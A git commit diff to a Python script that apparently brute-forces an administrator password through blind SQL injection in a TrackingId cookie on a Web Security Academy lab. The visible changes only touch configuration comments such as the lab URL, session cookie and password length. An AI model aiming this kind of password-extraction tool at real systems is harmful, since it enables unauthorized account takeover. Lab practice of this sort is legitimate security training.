14e103149802cf22bcb0a41ca7e61cd265c1e2de
Murtaza ( aka cisco) <pctech283@gmail.com>
2025-09-03 19:39:47 +0500

    Update script.py

--- script.py
+++ script.py
@@ -2,11 +2,11 @@ import requests
 import string
 
 # === CONFIGURATION ===
-URL = "https://0a6e004c047260f88147257a00d20024.web-security-academy.net/"  # Replace with your actual lab URL
+URL = "https://0a6e004c047260f88147257a00d20024.web-security-academy.net/"  # Replace with your actual  URL
 SESSION_COOKIE = "lOvRcLy1HinAOuVbLwEJhE5GCMZ1OajQ"              # Replace if session cookie is required
-INJECTION_POINT = "uJEOQEpITWS65hWW"                                  # TrackingId before the payload
-CHARS = string.ascii_lowercase + string.digits           # You can add uppercase or symbols if needed
-PASSWORD_LENGTH = 20
+INJECTION_POINT = "uJEOQEpITWS65hWW"                                  
+CHARS = string.ascii_lowercase + string.digits          
+PASSWORD_LENGTH = 20                                                  # Add password legnth 
 
 # === STARTING ATTACK ===
 headers = {
@@ -40,4 +40,5 @@ for i in range(1, PASSWORD_LENGTH + 1):
 
 print(f"\n[✓] Administrator password: {password}")
 input("\nPress Enter to exit...")
+
 
